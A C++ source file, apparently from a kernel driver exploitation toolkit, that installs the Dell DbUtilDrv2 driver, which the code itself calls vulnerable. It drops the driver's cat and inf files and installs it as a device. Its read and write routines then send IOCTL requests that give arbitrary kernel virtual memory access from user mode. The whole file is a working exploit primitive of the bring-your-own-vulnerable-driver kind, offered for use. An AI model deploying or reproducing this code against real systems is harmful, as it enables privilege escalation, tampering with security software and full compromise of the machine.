/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       DBUTIL.CPP
*
*  VERSION:     1.27
*
*  DATE:        07 Nov 2022
*
*  Dell BIOS Utility driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/dbutil.h"

WCHAR g_DbUtilHardwareId[] = { L'R', L'O', L'O', L'T', L'\\', L'D', L'B', L'U', L't', L'i', L'l', L'D', L'r', L'v', L'2', 0, 0, 0, 0 };
HDEVINFO g_DbUtilDevInfo = NULL;
SP_DEVINFO_DATA g_DbUtilDevInfoData;

#define DBUTILCAT_FILE TEXT("dbutildrv2.cat")
#define DBUTILINF_FILE TEXT("dbutildrv2.inf")

/*
* DbUtilManageFiles
*
* Purpose:
*
* Drop or remove required files from disk in the current process directory.
*
*/
BOOL DbUtilManageFiles(
    _In_ KDU_CONTEXT* Context,
    _In_ BOOLEAN DoInstall
)
{
    BOOL bResult = FALSE;
    LPWSTR lpEnd;
    LPWSTR lpFileName;

    PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    SIZE_T allocSize = 64 +
        ((_strlen(DBUTILCAT_FILE) + _strlen(DBUTILINF_FILE)) * sizeof(WCHAR)) +
        CurrentDirectory->Length;

    ULONG length;

    if (DoInstall) {

        //
        // Drop DbUtilDrv2.
        //
        if (!KDUProvExtractVulnerableDriver(Context))
            return FALSE;

        //
        // Drop cat and inf files.
        //
        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
        if (lpFileName) {

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(lpFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            lpEnd = _strcat(lpFileName, L"\\");
            _strcat(lpFileName, DBUTILCAT_FILE);
            if (supExtractFileFromDB(Context->ModuleBase, lpFileName, IDR_DATA_DBUTILCAT)) {
                *lpEnd = 0;
                _strcat(lpFileName, DBUTILINF_FILE);
                if (supExtractFileFromDB(Context->ModuleBase, lpFileName, IDR_DATA_DBUTILINF)) {

                    g_DbUtilDevInfo = NULL;

                    bResult = supSetupInstallDriverFromInf(lpFileName,
                        (PBYTE)&g_DbUtilHardwareId,
                        sizeof(g_DbUtilHardwareId),
                        &g_DbUtilDevInfo,
                        &g_DbUtilDevInfoData);

                }
            }

            supHeapFree(lpFileName);
        }
    }
    else {

        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
        if (lpFileName) {

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(lpFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            lpEnd = _strcat(lpFileName, L"\\");
            _strcat(lpFileName, DBUTILCAT_FILE);
            DeleteFile(lpFileName);

            *lpEnd = 0;

            _strcat(lpFileName, DBUTILINF_FILE);
            DeleteFile(lpFileName);

            supHeapFree(lpFileName);
            bResult = TRUE;
        }

    }
    return bResult;
}

/*
* DbUtilStartVulnerableDriver
*
* Purpose:
*
* Start vulnerable driver callback.
* Install DbUtil device.
*/
BOOL DbUtilStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL     bLoaded = FALSE;
    LPWSTR   lpDeviceName = Context->Provider->DeviceName;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {

        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is already loaded\r\n");

        bLoaded = TRUE;
    }
    else {

        //
        // Driver is not loaded, load it.
        //
        RtlSecureZeroMemory(&g_DbUtilDevInfoData, sizeof(g_DbUtilDevInfoData));
        bLoaded = DbUtilManageFiles(Context, TRUE);

    }

    //
    // If driver loaded then open handle for it and run optional callbacks.
    //
    if (bLoaded) {
        KDUProvOpenVulnerableDriverAndRunCallbacks(Context);
    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Vulnerable driver is not loaded\r\n");
    }

    return (Context->DeviceHandle != NULL);
}

/*
* DbUtilStopVulnerableDriver
*
* Purpose:
*
* Stop vulnerable driver callback.
* Uninstall DbUtil device and remove files.
*
*/
VOID DbUtilStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context
)
{
    LPWSTR lpFullFileName = Context->DriverFileName;

    supSetupRemoveDriver(g_DbUtilDevInfo, &g_DbUtilDevInfoData);
    DbUtilManageFiles(Context, FALSE);

    if (supDeleteFileWithWait(1000, 5, lpFullFileName))
        printf_s("[+] Vulnerable driver file removed\r\n");
}

/*
* DbUtilReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    DWORD dwError = ERROR_SUCCESS;
    DBUTIL_READWRITE_REQUEST* pRequest;

    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

    pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Unused = 0xDEADBEEF;
            pRequest->VirtualAddress = VirtualAddress;
            pRequest->Offset = 0;

            bResult = supCallDriver(DeviceHandle,
                IOCTL_DBUTIL_READVM,
                pRequest,
                (ULONG)size,
                pRequest,
                (ULONG)size);

            if (!bResult) {
                dwError = GetLastError();
            }
            else {
                RtlCopyMemory(Buffer, pRequest->Data, NumberOfBytes);
            }

            VirtualUnlock(pRequest, size);
        }

        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;

}

/*
* DbUtilWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Dell DbUtil driver.
*
*/
_Success_(return != FALSE)
BOOL WINAPI DbUtilWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    SIZE_T size;
    DWORD dwError = ERROR_SUCCESS;

    DBUTIL_READWRITE_REQUEST* pRequest;

    size = (SIZE_T)FIELD_OFFSET(DBUTIL_READWRITE_REQUEST, Data) + NumberOfBytes;

    pRequest = (DBUTIL_READWRITE_REQUEST*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Unused = 0xDEADBEEF;
            pRequest->VirtualAddress = VirtualAddress;
            pRequest->Offset = 0;
            RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

            bResult = supCallDriver(DeviceHandle,
                IOCTL_DBUTIL_WRITEVM,
                pRequest,
                (ULONG)size,
                pRequest,
                (ULONG)size);

            if (!bResult)
                dwError = GetLastError();

            VirtualUnlock(pRequest, size);
        }

        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;
}
